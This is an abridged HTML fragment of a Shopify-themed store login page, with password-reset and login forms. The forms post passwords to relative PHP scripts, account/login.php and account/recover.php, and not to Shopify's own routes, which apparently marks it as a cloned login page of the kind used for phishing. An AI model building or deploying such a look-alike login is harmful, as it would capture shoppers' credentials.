  ...
  <section id="shopify-section-template--16885347680502__main" class="shopify-section t4s-section t4s-section-customers t4s-container">
    ...
    <div class="t4s-customer is--login t4s-text-start">
      ...
      <div id="recover">
        ...
        <form method="post" action="account/recover.php" accept-charset="UTF-8">
          ...
          <div class="t4s_field t4s_mb_20">
            <button class="t4s_btn_submmit t4s-btn t4s-btn-base t4s-btn-full-width t4s-btn-style-default t4s-btn-size-medium t4s-btn-color-dark t4s-btn-effect-overlay-run" disabled>Reset Password</button>
          </div>
          <a class="t4s-d-inline-block" href="#login">Cancel </a>
        </form>
      </div>
      ...
      <div id="login">
        <form method="post" action="account/login.php" id="customer_login" accept-charset="UTF-8" data-login-with-shop-sign-in="true" novalidate="novalidate">
          ...
          <div class="t4s_field t4s-pr t4s_mb_10">
            <input class="t4s_frm_input" type="password" value="" name="password" id="CustomerPassword" autocomplete="current-password" placeholder="Password">
